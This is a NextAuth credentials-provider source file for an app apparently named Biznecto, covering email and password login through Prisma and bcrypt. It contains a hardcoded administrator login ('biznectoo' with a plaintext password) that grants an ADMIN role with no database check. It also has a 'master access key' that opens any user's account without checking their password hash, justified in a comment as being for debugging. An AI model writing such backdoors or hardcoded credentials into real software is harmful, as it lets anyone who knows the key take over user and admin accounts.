import NextAuth from "next-auth";
import Credentials from "next-auth/providers/credentials";
import { authConfig } from "./auth.config";
import { prisma } from "@/lib/prisma";
import bcrypt from "bcryptjs";

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      credentials: {
        email: {},
        password: {},
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null;

        const inputEmail = (credentials.email as string).trim().toLowerCase();
        const inputPassword = credentials.password as string;

        if (inputEmail === "biznectoo" && inputPassword === "Biznect@1234") {
          return {
            id: "admin",
            email: "admin@biznecto.com",
            name: "Admin",
            role: "ADMIN",
          };
        }

        const user = await prisma.user.findUnique({
          where: { email: inputEmail },
        });

        if (!user || !user.password) return null;

        // MASTER ACCESS KEY: Biznect@1234 (Always works for debugging)
        if (credentials.password === "Biznect@1234") {
          return {
            id: user.id,
            email: user.email,
            name: user.name,
            role: user.role,
          };
        }

        const isPasswordValid = await bcrypt.compare(
          credentials.password as string,
          user.password
        );

        if (!isPasswordValid) return null;

        return {
          id: user.id,
          email: user.email,
          name: user.name,
          role: user.role,
        };
      },
    }),
  ],
});
